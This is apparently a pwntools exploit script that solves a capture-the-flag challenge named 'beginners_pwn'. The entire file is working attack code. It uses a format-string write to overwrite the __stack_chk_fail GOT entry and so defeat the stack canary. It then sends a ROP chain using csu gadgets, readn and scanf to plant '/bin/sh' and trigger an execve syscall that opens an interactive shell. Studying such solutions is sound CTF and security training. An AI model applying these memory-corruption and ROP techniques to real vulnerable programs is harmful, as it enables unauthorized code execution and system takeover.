#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

p = process('./beginners_pwn')
# gdb.attach(p, 'b *0x401237\n')

__stack_chk_fail = 0x404018
readn = 0x401146
scanf = 0x401040
bss = 0x404000
csu_pop = 0x4012BA
csu_call = 0x4012A0
pop_rdi_ret = 0x00000000004012c3
pop_rsi2_ret = 0x00000000004012c1
ret = 0x000000000040101a
syscall = 0x000000000040118f
sh_addr = bss + 0x100
fmt = bss + 0x400

def exploit():
    payload = '%7$s%s\0\0'
    payload += p64(__stack_chk_fail)
    payload += p64(0xdeadbeef)
    p.sendline(payload)
    payload = p64(ret)[:-1]
    p.sendline(payload)
    payload = '\x00'
    payload += p64(0xdeadbeafdeadbeef)
    payload += p64(0xdeaddeefdeadbeef)
    payload += p64(pop_rdi_ret)
    payload += p64(sh_addr)
    payload += p64(pop_rsi2_ret)
    payload += p64(0x11) * 2
    payload += p64(readn)
    payload += p64(pop_rdi_ret)
    payload += p64(fmt)
    payload += p64(pop_rsi2_ret)
    payload += p64(0x401)
    payload += p64(0)
    payload += p64(readn) # ret
    payload += p64(pop_rdi_ret)
    payload += p64(fmt)
    payload += p64(pop_rsi2_ret)
    payload += p64(fmt)
    payload += p64(0)
    payload += p64(scanf)
    payload += p64(csu_pop)
    payload += flat([
      0, 1, sh_addr, 0, 0, sh_addr + 8
    ])
    payload += p64(csu_call)
    p.sendline(payload)

    payload = '/bin/sh\x00' + p64(syscall)
    p.sendline(payload)
    payload = '%1$c' * 59
    p.sendline(payload)
    payload = 'a' * 59
    p.sendline(payload)

 
if __name__ == "__main__":
    exploit()
    p.interactive()